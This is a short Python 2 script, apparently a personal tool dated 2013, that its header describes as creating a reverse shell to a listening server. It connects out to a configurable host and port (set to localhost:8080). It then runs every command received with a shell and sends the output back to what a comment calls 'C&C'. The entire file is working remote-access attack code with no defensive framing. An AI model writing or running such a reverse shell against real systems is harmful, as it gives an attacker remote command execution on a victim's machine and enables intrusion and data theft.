#!/usr/bin/python
#
# tjcwilk - 03/10/2013
#    Creates a reverse shell back to a listning server
#

import socket
import subprocess

# Define remote
HOST = '127.0.0.1'            # The remote host
PORT = 8080                   # The same port as used by the server

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send('[*] Connection Established!')


while 1:
     # recieve shell command
     data = s.recv(1024)

     # if its quit, then break out and close socket
     if data == "quit": break
     
     # Execute a received command
     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     
     # read output
     stdout_value = proc.stdout.read() + proc.stderr.read()
     
     # send output to C&C
     s.send(stdout_value)

# Close the socket
s.close()
